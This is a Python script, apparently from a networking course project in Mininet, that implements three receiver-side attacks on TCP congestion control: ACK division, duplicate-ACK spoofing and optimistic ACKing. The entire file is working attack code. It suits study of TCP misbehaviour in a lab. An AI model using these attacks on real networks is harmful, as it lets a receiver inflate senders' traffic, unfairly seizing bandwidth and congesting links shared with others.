from tcp_cong import *
import time


class Attack1_Div(ClntTCP):
    def __init__(self, num, host, **kwargs):
        ClntTCP.__init__(self, 'receiver', host, **kwargs)
        self.num_division = num
        self.log_attacker = True

    def after_pck(self, pkt, status):
        if pkt[scp.TCP].seq == 1:
            new_seq = pkt[scp.TCP].seq

            payload_len = min(MSS, len(pkt[scp.TCP].payload))
            cur_ack_no = new_seq
            for i in xrange(self.num_division):
                if i == self.num_division - 1:
                    cur_ack_no = new_seq + payload_len
                else:
                    cur_ack_no = cur_ack_no + payload_len / self.num_division
                self.send_ack(cur_ack_no)
        else:
            ClntTCP.after_pck(self, pkt, status)


class Attack2_Dup(ClntTCP):
    def __init__(self, num, host, **kwargs):
        ClntTCP.__init__(self, 'receiver', host, **kwargs)
        self.num_dupacks = num
        self.log_attacker = True

    def after_pck(self, pkt, status):
        if pkt[scp.TCP].seq == 1:
            for _ in xrange(self.num_dupacks):
                self.send_ack(self.ack)
        else:
            ClntTCP.after_pck(self, pkt, status)


class Attack3_Opt(ClntTCP):
    def __init__(self, num, interval, host, **kwargs):
        ClntTCP.__init__(self, 'receiver', host, **kwargs)
        self.num_optacks = num
        self.ack_interval = interval
        self.log_attacker = True

    def after_pck(self, pkt, status):
        cur_ack_no = 1
        if pkt[scp.TCP].seq == 1:
            for _ in xrange(self.num_optacks):
                cur_ack_no += MSS
                self.send_ack(cur_ack_no)
                time.sleep(self.ack_interval / 1000.)
        else:
            ClntTCP.after_pck(self, pkt, status)


def check_attack_sort(val):
    if val not in ['div', 'dup', 'opt']:
        raise argparse.ArgumentTypeError("%s is an invalid attack name." % val)
    return val


def parse_args():
    parser = argparse.ArgumentParser(description= \
                                         "TCP_Project_Attack_Beginning")
    parser.add_argument('--host', dest='host',
                        required=True, help="Mininet host (`h1` or `h2`)")
    parser.add_argument('--attack', dest='attack', required=True,
                        type=check_attack_sort,
                        help="Configure attack type:  (`div`, `dup`, or `opt`).")

    parser.add_argument('--num', dest='num', required=True, type=int,
                        help=" spoofed ACKs number from the attacker sending packets.")
    parser.add_argument('--interval', dest='interval', type=int,
                        help="Forwarding opt acks time described in ms.")

    parser.add_argument("--verbose", dest='verbose', action='store_true',
                        help="flag of the TCP detailed log.")

    args = parser.parse_args()
    if args.attack == 'opt' and args.interval is None:
        parser.error('attack3 opt attack needs --interval.')

    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    kwargs = {'verbose': args.verbose}
    if args.attack == 'div':
        attacker = Attack1_Div(args.num, args.host, **kwargs)
    if args.attack == 'dup':
        attacker = Attack2_Dup(args.num, args.host, **kwargs)
    if args.attack == 'opt':
        attacker = Attack3_Opt(args.num, args.interval, args.host, **kwargs)

    attacker.start()
